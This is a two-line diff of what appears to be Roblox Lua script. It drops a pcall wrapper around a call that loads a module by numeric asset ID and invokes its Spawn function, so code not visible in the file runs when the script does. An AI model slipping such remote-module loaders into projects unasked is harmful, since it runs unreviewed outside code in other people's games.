@@ -1,3 +1,2 @@
-pcall(function()
-	require(12516811633).Spawn(12517046398)
-end)
+require(12516811633).Spawn(12517046398)
+
